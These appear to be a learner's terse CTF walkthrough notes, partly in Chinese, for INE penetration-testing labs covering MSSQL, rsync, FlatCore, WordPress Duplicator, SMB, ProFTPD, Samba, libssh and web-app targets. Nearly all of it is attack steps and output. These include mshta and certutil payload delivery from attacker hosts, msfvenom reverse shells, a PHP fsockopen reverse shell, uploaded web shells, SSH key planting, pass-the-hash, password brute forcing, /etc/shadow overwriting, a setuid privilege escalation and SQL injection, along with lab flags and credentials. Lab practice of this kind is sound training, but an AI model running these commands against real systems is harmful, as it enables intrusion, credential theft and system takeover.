# Host & Network Penetration Testing: The Metasploit Framework CTF 1
	強調 Windows 環境中與錯誤配置的帳戶、暴露的目錄和不當的權限管理相關的風險
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nmap -sV -sC target.ine.local
		1433/tcp  open  ms-sql-s           Microsoft SQL Server 2012 11.00.6020.00; SP3
		| ms-sql-info: 
		|   10.0.23.174\MSSQLSERVER: 
		|     Instance name: MSSQLSERVER

	ifconfig (10.10.43.9)
	msfconsole -q
		searchsploit Microsoft SQL Server 
		search Microsoft SQL Server 2012

	存取目標電腦上的 MSSQLSERVER 
	Windows 設定資料夾
	隱藏在系統目錄中
	調查管理員目錄
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	使用 mshta 負載在 netcat 中取得反向 shell，使用 mssql_exec 執行它，
	使用 certutil 提升到傳輸 .exe 負載的 meterpreter 會話。
	使用 getsystem 升級權限。取得 shell (cmd) powershell 向我拋出錯誤。
 	到 C:\ 並在 cmd 中「dir /S /B | findtstr /I “flag*” 並使用 type 指令取得所有標誌

	dir /S /B | findstr /I "flag*"

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use auxiliary/scanner/mssql/mssql_version
		[+] target.ine.local:1433 - Version: 11.0.6020
		[+] target.ine.local:1433 - Encryption: unsupported
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use auxiliary/scanner/mssql/mssql_login 
		use auxiliary/scanner/mysql/mysql_login
		set RHOSTS target.ine.local
		set USERNAME sa
		set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
		set VERBOSE false
		set RPORT 1433
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use  use auxiliary/scanner/mssql/mssql_ping
		[+] 10.0.23.174:          -    ServerName      = WIN-5BQ22OKH4SO
		[+] 10.0.23.174:          -    InstanceName    = MSSQLSERVER
		[+] 10.0.23.174:          -    IsClustered     = No
		[+] 10.0.23.174:          -    Version         = 11.0.6020.0
		[+] 10.0.23.174:          -    tcp             = 1433

	hydra -l sa -p '' 10.0.23.174 mssql  
		[1433][mssql] host: 10.0.23.174   login: sa

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use auxiliary/admin/mssql/mssql_enum 
		set RHOSTS target.ine.local
		set USERNAME  sa
		set PASSWORD ''
		set DATABASE ''

	[*] 10.0.23.174:1433 - Windows Logins on this Server:
	[*] 10.0.23.174:1433 -  ATTACKDEFENSE\Administrator
	[*] 10.0.23.174:1433 -  NT SERVICE\SQLWriter
	[*] 10.0.23.174:1433 -  NT SERVICE\Winmgmt
	[*] 10.0.23.174:1433 -  NT Service\MSSQLSERVER
	[*] 10.0.23.174:1433 -  NT AUTHORITY\SYSTEM
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q
		use exploit/windows/misc/hta_server
		exploit
	[*] Using URL: http://10.10.43.8:8080/A67Ez5R.hta
	mshta.exe http://10.10.43.8:8080/A67Ez5R.hta
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use auxiliary/admin/mssql/mssql_exec
		set CMD mshta.exe http://10.10.43.8:8080/A67Ez5R.hta
		set RHOSTS target.ine.local
		set USERNAME  sa
		set PASSWORD ''
		set DATABASE ''
		run
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		sessions -i 1
		meterpreter > getsystem (root)
		powershell 
		Get-ChildItem -Path C:\ -Filter "flag*" -Recurse
		cat C:\\Users\\Administrator\\Desktop\\flag4.txt
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		C:\flag1.txt 
		C:\Windows\System32\config\flag2.txt 
		C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt 
		C:\Users\Administrator\Desktop\flag4.txt
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	Other method : 
		msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your_IP> LPORT=<your_port> -f hta-psh -o payload.hta
		python3 -m http.server 80
		nc -lvnp 1234
		cmd: 'mshta http://<attacker_ip>/payload.hta'
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		meterpreter shell: 
		msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your_IP> LPORT=<your_port> -f exe -o shell.exe
		certutil.exe -urlcache - split -f http://<attacker_ip>/shell.exe shell.exe
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		#use multi/handler, set lhost,lport 選項與payload設定相同
		useexploit/multi/handler 
		setpayloadwindows /x64/meterpreter/ 
		reverse_tcpsetLHOST <your_IP> 
		setLPORT <your_port> 
		exploit
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		cmd: .\shell.exe
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		getsystem
# Host & Network Penetration Testing: The Metasploit Framework CTF 2
	nmap -sV -sC target1.ine.local 
		873/tcp open  rsync   (protocol version 31)
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	了解正在執行的服務及其版本 : Banner Grabbing (橫幅抓取)
		nc -nv 192.82.161.3 873
		@RSYNCD: 31.0 sha512 sha256 sha1 md5 md4
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nmap -sV --script "rsync-list-modules" -p 873 target1.ine.local

	use auxiliary/scanner/rsync/modules_list  
	set RHOSTS target1.ine.local 
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	枚舉共享
		rsync target1.ine.local::
	=> 允許匿名未經驗證的存取
		backupwscohen   FLAG1_9d290f5943514531b7a6493cec75c4aa 
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	詳細枚舉以查看文件和權限
	rsync -av --list-only rsync://target1.ine.local/backupwscohen
	receiving incremental file list                                                                                   
	drwxr-xr-x          4,096 2025/01/18 21:23:32 .                                                                   
	-rw-r--r--             20 2024/10/28 15:05:40 TPSData.txt                                                         
	-rw-r--r--             25 2024/10/28 15:05:40 office_staff.vhd                                                    
	-rw-r--r--             39 2025/01/18 21:23:32 pii_data.xlsx   
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	DOWNLOAD: 
	rsync -av rsync://target1.ine.local/backupwscohen/ .

	FLAG2_d6890ca748154d48ad40297da3aef612

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	上傳
		nano test 
		rsync test target1.ine.local::backupwscohen
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	CHECK: 
		rsync -av --list-only rsync://target1.ine.local/backupwscohen
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	在本地建立.ssh目錄和authorized_keys檔案
		cd Desktop
		mkdir .ssh && touch .ssh/authorized_keys
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	Generate SSH Keys  : 
		cd .ssh
		ssh-keygen -t rsa -b 4096
		cp id_rsa.pub /root/Desktop/.ssh/authorized_keys

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	獲得持久
		rsync -av home_user/.ssh/ rsync://user@target_host/home_user/.ssh
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	將.ssh目錄的內容上傳
		cd Desktop
		rsync -r ./.ssh/ target1.ine.local::backupwscohen/.ssh
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	測試身份驗證
		rsync -r target1.ine.local::backupwscohen/.ssh
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	機器私鑰來執行 SSH 命令
		ssh -i id_rsa backupwscohen@target1.ine.local -p 873
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nmap -sV -sC target2.ine.local 
		80/tcp  open  http     Apache httpd 2.4.52 ((Ubuntu))
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	dirb http://target2.ine.local 
		--- Scanning URL: http://target2.ine.local/ ----
		==> DIRECTORY: http://target2.ine.local/api/                                                                     
		==> DIRECTORY: http://target2.ine.local/app/                                                                     
		+ http://target2.ine.local/cgi-bin/ (CODE:403|SIZE:282)                                                          
		==> DIRECTORY: http://target2.ine.local/configs/                                                                 
		==> DIRECTORY: http://target2.ine.local/inc/                                                                     
		+ http://target2.ine.local/index.html (CODE:200|SIZE:3520)                                                       
		==> DIRECTORY: http://target2.ine.local/javascript/                                                              
		==> DIRECTORY: http://target2.ine.local/keys/                                                                    
		+ http://target2.ine.local/LICENSE (CODE:200|SIZE:11357)                                                         
		==> DIRECTORY: http://target2.ine.local/log/                                                                     
		+ http://target2.ine.local/server-status (CODE:403|SIZE:282)   
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q
		search Roxy-WI
		use exploit/linux/http/roxy_wi_exec 
		set RHOSTS target2.ine.local 
		set LHOST 192.82.161.2
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		cd /
		FLAG3_992a61403a274195a08ade28edb1794e
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	自動化任務//正在運行 ps
	=> Cron Jobs
	 User-specific cron jobs: /var/spool/cron/crontabs/
	    System-wide cron jobs:
		/etc/cron.d/
		/etc/cron.daily/
		/etc/cron.hourly/
		/etc/cron.weekly/
		/etc/cron.monthly/
		/etc/crontab
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	cd /etc/cron.d/
	cat www-data-cron
# Host & Network Penetration Testing: Exploitation CTF 1 (linux)
	=> target1.ine.local and target2.ine.local
	1.vulnerable web application  (root directory) 
	2.不安全系統使用者
	3.易受攻擊的插件
	4.不需要身份驗證系統使用者
	
	/usr/share/nmap/nselib/data/wp-plugins.lst
	/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
	
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nmap -sV -sC target1.ine.local
		22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
		80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
		| http-cookieflags:   
		|   /:  
		|    PHPSESSID: 
		|_      httponly flag not set  
		|_http-generator:flatCore (cms)                    
		|_http-title: Homepage 
		|_http-server-header: Apache/2.4.41 (Ubuntu)
		| http-robots.txt: 4 disallowed entries 
		|_/acp/ /core/ /lib/ /modules/
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	dirb http://target1.ine.local
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	searchsploit flatCore
		FlatCore CMS 2.0.7 - Remote Code Execution (RCE) (Authenticated)    | php/webapps/50262.py
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	searchsploit -m 50262
		python3 50262.py http://target1.ine.local admin password1
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		php -r '$sock=fsockopen("192.9.169.2",1235);exec("/bin/bash -i <&3 >&3 2>&3");'
		nc -lvnp 1234
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		FLAG1{304c136f3ee64d6093681bf6f5808e48}
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q
		use exploit/multi/handler
		set LHOST 192.9.169.2
		set payload linux/x86/shell/reverse_tcp
		set LPORT 1235
		exploit
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		sessions -u 1
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	meterpreter > shell
		$ cat /etc/passwd (user)
		iamaweakuser:x:1000:1000::/home/iamaweakuser:/bin/bash
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	hydra -l iamaweakuser -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target1.ine.local ssh
	
		[22][ssh] host: target1.ine.local   login: iamaweakuser   password: angel
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	ssh iamaweakuser@target1.ine.local 
		FLAG2{ea13c4f5c7b44c27b7c23642b80fe985}
	
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nmap -sV -sC target2.ine.local
		22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
		80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
		80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
		|_http-server-header: Apache/2.4.41 (Ubuntu)
		|_http-title: sample_site
		|_http-generator: WordPress 6.1
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nmap --script=http-wordpress-enum target2.ine.local
		| http-wordpress-enum: 
		| Search limited to top 100 themes/plugins
		|   plugins
		|     akismet 5.0.1
		|_    duplicator 1.3.26

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	dirb http://target2.ine.local
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	searchsploit duplicator
		Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read (Met | php/webapps/49288.rb
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use auxiliary/scanner/http/wp_duplicator_file_read
		set RHOSTS target2.ine.local
		set filepath /flag3.txt

		set filepath /etc/passwd
		iamacrazyfreeuser:x:1000:1000:,,,:/home/iamacrazyfreeuser:/bin/bash
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	hydra -l iamacrazyfreeuser -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target2.ine.local ssh
	if show all => mean no password !!!!!!!!!!!
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	ssh iamacrazyfreeuser@target2.ine.local

# Host & Network Penetration Testing: Exploitation CTF 2	(window)
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	ifconfig (10.10.43.9) 
	ping target.ine.local
	PING target.ine.local (10.0.20.158) 56(84) bytes of data.
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nmap -sV -sC -p139,445 target.ine.local
	21/tcp    open  ftp                Microsoft ftpd
	80/tcp    open  http               Microsoft IIS httpd 8.5
	135/tcp   open  msrpc              Microsoft Windows RPC
	139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds?

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	(error) hydra -l tom -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target.ine.local smb
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use auxiliary/scanner/smb/smb_login
	set SMBUser tom
	set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
	set RHOSTS target.ine.local
	set VERBOSE false
	exploit
	
	[+] 10.0.20.158:445       - 10.0.20.158:445 - Success: '.\tom:felipe'
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use /auxiliary/scanner/smb/smb_version
	[*] 10.0.20.158:445       - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.0.2) (signatures:optional) (uptime:31m 5s) (guid:{d9ad17d5-f431-4f39-965e-dc57c0c1d689}) (authentication domain:WIN-M878Q9NE9S6)
	[*] target.ine.local:     - Scanned 1 of 1 hosts (100% complete)
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	smbmap -u tom -p felipe -H target.ine.local

        HRDocuments                                             READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        print$                                                  READ ONLY       Printer Drivers
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	enum4linux -u tom -p felipe target.ine.local
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	smbclient //target.ine.local/HRDocuments -U tom
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	(wrong) 
	hashcat -m 1000 -a 0 leaked-hashes.txt /usr/share/wordlists/rockyou.txt 
	hashcat -a 0 -m 1000 leaked-hashes.txt /usr/share/wordlists/metasploit/unix_passwords.txt
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	set SMBUser nancy
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	NTLM hash list !!!!!

	msfconsole -q
	use auxiliary/scanner/smb/smb_login
	set RHOSTS target.ine.local
	set USERNAME nancy
	set PASS_FILE leaked-hashes.txt
	set SMB_PASS_HASH true
	run

	[+] 10.0.29.223:445       - 10.0.29.223:445 - Success: '.\nancy:aad3b435b51404eeaad3b435b51404ee:b3ddea4b4b957f3e037af75cfe5317ad'

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	smbmap -H 10.0.29.223 -u nancy -p 'aad3b435b51404eeaad3b435b51404ee:b3ddea4b4b957f3e037af75cfe5317ad'
	
	IPC$                                                    READ ONLY       Remote IPC
        ITResources                                             READ ONLY
        print$                                                  READ ONLY       Printer Drivers

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	smbclient //10.0.29.223/ITResources -U nancy --pw-nt-hash 'b3ddea4b4b957f3e037af75cfe5317ad'
	
	Who knows, these creds might come handy! ---> david:omnitrix_9901
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q
	use auxiliary/scanner/smb/smb_login
	set RHOSTS target.ine.local
	set USERNAME david
	set PASSWORD omnitrix_9901
	run
	
	[+] 10.0.29.223:445       - 10.0.29.223:445 - Success: '.\david:omnitrix_9901'
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	smbmap -u david -p omnitrix_9901 -H target.ine.local
 	NO ACCESS
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	ftp david@10.0.29.223 21 
	
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.38.6 LPORT=4444 -f aspx -o shell.aspx
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	put shell.aspx
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use exploit/multi/handler
	set payload windows/x64/meterpreter/reverse_tcp
	set LHOST 10.10.38.6
	set LPORT 4444
	exploit
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	瀏覽器 : http://10.0.29.223/shell.aspx
# Host & Network Penetration Testing: Exploitation CTF 3
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nmap -sV -sC target1.ine.local 
	21/tcp open  ftp     ProFTPD 1.3.5
	80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
	|_http-title: Apache2 Ubuntu Default Page: It works
	|_http-server-header: Apache/2.4.41 (Ubuntu)
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q
		use exploit/unix/ftp/proftpd_modcopy_exec
		set payload payload/cmd/unix/reverse
		set RHOSTS target1.ine.local 
		set LHOST 192.52.134.2
		set SITEPATH /var/www/html
		run
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	quick interaction with a local network service
	識別本地網路服務

	netstat -tulnp 127.0 .0 .1
	tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      -            
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nc 127.0.0.1 8888
	Enter the secret passphrase: letmein
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nmap -sV -sC target2.ine.local 
	80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))                                                          
	|_http-server-header: Apache/2.4.41 (Ubuntu)                                                                      
	|_http-title: Can you Pwn me?                                                                                     
	139/tcp open  netbios-ssn Samba smbd 4.6.2                                                                        
	445/tcp open  netbios-ssn Samba smbd 4.6.2  
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	searchsploit Samba
	Sambar Server 4.4/5.0 - 'pagecount' File Overwrite                              | multiple/remote/21026.txt
	Sambar Server 4.x/5.0 - Insecure Default Password Protection                    | multiple/remote/21027.txt
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	enum4linux -a target2.ine.local 

        print$          Disk      Printer Drivers
        site-uploads    Disk      
        IPC$            IPC       IPC Service (target2 server (Samba, Ubuntu))
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfvenom -p php/meterpreter/reverse_tcp LHOST=192.52.134.2 LPORT=1234 -f raw > shell.php
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	smbclient //192.52.134.4/site-uploads
	put shell.php
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use exploit/multi/handler
	set payload php/meterpreter/reverse_tcp
	set LHOST 192.52.134.2
	set LPORT 1234
	exploit
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	http://target2.ine.local/site-uploads/shell.php
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	(root)
	cat /etc/shells
	# /etc/shells: valid login shells
	/bin/sh
	/bin/bash
	/usr/bin/bash
	/bin/rbash
	/usr/bin/rbash
	/bin/dash
	/usr/bin/dash
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	檢查 shell 權限
	ls -l /bin/sh /bin/bash /usr/bin/bash /bin/rbash /usr/bin/rbash /bin/dash /usr/bin/dash
	-rwxr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
	-rwxr-xr-x 1 root root  129816 Jul 18  2019 /bin/dash
	lrwxrwxrwx 1 root root       4 Apr 18  2022 /bin/rbash -> bash
	lrwxrwxrwx 1 root root       4 Jul 18  2019 /bin/sh -> dash
	-rwxr-xr-x 1 root root 1183448 Apr 18  2022 /usr/bin/bash
	-rwxr-xr-x 1 root root  129816 Jul 18  2019 /usr/bin/dash
	lrwxrwxrwx 1 root root       4 Apr 18  2022 /usr/bin/rbash -> bash

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	列出所有設定了 setuid 位元的可執行檔
	find / -perm -4000 2>/dev/null
	/usr/bin/find
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	find . -exec /bin/sh -p \; -quit
# Host & Network Penetration Testing: Post-Exploitation CTF 1
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	後利用(POST): 
	=>透過升級權限、保持持久性和收集敏感資訊來最大化其存取的價值
	=>轉向其他系統、提取密碼、竊取機密資料
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nmap -sV -sC target1.ine.local
	22/tcp open  ssh     libssh 0.8.3 (protocol 2.0)
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q
	use auxiliary/scanner/ssh/libssh_auth_bypass
	set RHOSTS target1.ine.local
	set SPAWN_PTY true
	run
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use post/linux/gather/enum_configs
	use post/linux/gather/enum_network
	use post/linux/gather/enum_system
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	User account: 
	1. /etc/passwd
	=> FLAG1_68cd0d6287854343b0f9719ee70e0f79
	2. /etc/shadow
	3. /etc/group
	=> FLAG2_10ae718c28f949bbb90ca1fc34bd8e79
	4. /etc/gshadow
	5.Home Directories
	6.User Management Commands
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	Corn jobs : 
	cd /etc/cron.d
	FLAG3_d79328b031d04bf5b73f14de30a264d2

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	DNS configurations : 
	1. /etc/resolv.conf
	2. /etc/nsswitch.conf
	3. /etc/hosts
	=> FLAG4_4e6c93d5cdbb4ab6b8d46f110f594dac
	4. DNS Server Configuration Files
	/etc/bind/named.conf (Debian/Ubuntu)
	/etc/named.conf (Red Hat/CentOS)
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	credentials.txt => john:Pass@john123
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	(root)
	nmap -sV -sC target2.ine.local
	22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
	25/tcp open  smtp    Postfix smtpd
	80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	ssh john@target2.ine.local
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	find 容易寫入的資料夾
	--> find / -writable 2>/dev/null
	/etc/shadow
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	ls -la /etc/shadow
	-rw-rw-rw- 1 root shadow 959 Nov 14 07:58 /etc/shadow
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	mkpasswd -m sha-512 sekkio123
	$6$PwkKkbW7VsRvvpd8$mp7cPUay5DKtYs7nBXxrf6VZchXEZe5Hw0IBL93OtP5US6pglUgQLaNKm.lH4O.Z70fM/mibls67361/7MOrZ.
	nano /etc/shadow
	root:$6$PwkKkbW7VsRvvpd8$mp7cPUay5DKtYs7nBXxrf6VZchXEZe5Hw0IBL93OtP5US6pglUgQLaNKm.lH4O.Z70fM/mibls67361/7MOrZ.:....
	su root
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	LinEnum 
	=>  wget http://<lhost>/LinEnum.sh linenum.sh
	chmod +x linenum.sh
	./LinEnum.sh
	openssl passwd -6 password123
# Host & Network Penetration Testing: Post-Exploitation CTF 2
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nmap -sV -sC target.ine.local
	22/tcp    open  ssh                OpenSSH for_Windows_9.5 (protocol 2.0)
	135/tcp   open  msrpc              Microsoft Windows RPC
	139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds?
	3389/tcp  open  ssl/ms-wbt-server?
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	ping target.ine.local (10.0.28.35)
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	hydra -l alice -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target.ine.local ssh
	[22][ssh] host: target.ine.local   login: alice   password: princess1
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	ssh alice@target.ine.local
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q
	use auxiliary/scanner/ssh/ssh_login
	set RHOSTS target.ine.local
	set USERNAME alice
	set PASSWORD princess1
	exploit
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use auxiliary/scanner/ssh/ssh_login
	set RHOSTS target.ine.local
	set USERNAME alice
	set PASSWORD princess1
	exploit
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	sessions -u 1 
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	download hashdump.txt
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	gzip -d /usr/share/wordlists/rockyou.txt.gz
	hashcat -m 1000 -a 0 hashdump.txt /usr/share/wordlists/rockyou.txt 
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	8883a4229c5553c9cca6856a53011e4c:princess1                
	ca8e025e9893e8ce3d2cbf847fc56814:orange  
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	cat hashdump.txt | grep ca8e025e9893e8ce3d2cbf847fc56814
	david:1016:aad3b435b51404eeaad3b435b51404ee:ca8e025e9893e8ce3d2cbf847fc56814:::
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	use auxiliary/scanner/ssh/ssh_login
	set RHOSTS target.ine.local
	set USERNAME david
	set PASSWORD orange  
	exploit
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	sessions -u 3
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	meterpreter > getsystem
	meterpreter > cd C://Windows//System32//config 
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	cd /Users/Administrator
	系統使用者權限被拒絕: 
	=> SYSTEM user permission denied
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	修改 ACL
	=> icacls用於修改檔案和目錄的存取控制清單 (ACL)
	=> 刪除 SYSTEM 帳戶對位於 的資料夾的拒絕權限
	icacls flag /remove:d "NT AUTHORITY\SYSTEM"
# Web Application Penetration Testing CTF 1
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	=> 識別和利用 Web 應用程式中的漏洞以評估其安全狀況
	=> 發現 SQL 注入、跨網站腳本 (XSS)、本機檔案包含 (LFI) 
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	/usr/share/wordlists/dirb/common.txt 
	/usr/share/seclists/Usernames/top-usernames-shortlist.txt 
	/root/Desktop/wordlists/100-common-passwords.txt
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nmap -sV -sC target.ine.local
	80/tcp open  http    gunicorn
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	dirb http://target.ine.local /usr/share/wordlists/dirb/common.txt
	+ http://target.ine.local/about (CODE:200|SIZE:2858)                                                             
	+ http://target.ine.local/login (CODE:200|SIZE:3377)                                                             
	+ http://target.ine.local/logout (CODE:302|SIZE:189)                                                             
	+ http://target.ine.local/secured (CODE:308|SIZE:251)   
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	http://target.ine.local/view_file?file=/flag.txt
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	http://target.ine.local/secured/flag.txt
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /root/Desktop/wordlists/100-common-passwords.txt target.ine.local http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid username or password"

	[80][http-post-form] host: target.ine.local   login: guest   password: butterfly1
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	sqli : usernmae : admin' --
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
